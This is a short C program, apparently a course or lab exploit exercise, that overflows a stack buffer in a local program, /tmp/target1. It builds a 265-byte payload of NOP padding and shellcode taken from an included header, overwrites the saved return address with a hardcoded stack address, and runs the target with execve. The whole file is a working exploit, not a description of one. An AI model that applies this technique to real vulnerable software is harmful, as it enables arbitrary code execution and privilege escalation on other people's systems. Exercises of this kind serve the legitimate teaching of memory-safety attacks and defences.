#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

static char payload[265];

int main(void)
{
  char *args[3];
  char *env[1];

  memset(payload, 0x90, 265);
  memcpy(payload, shellcode, strlen(shellcode));
  *(int *)(payload + 260) = 0xbffffc28;
  payload[264] = '\0';

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
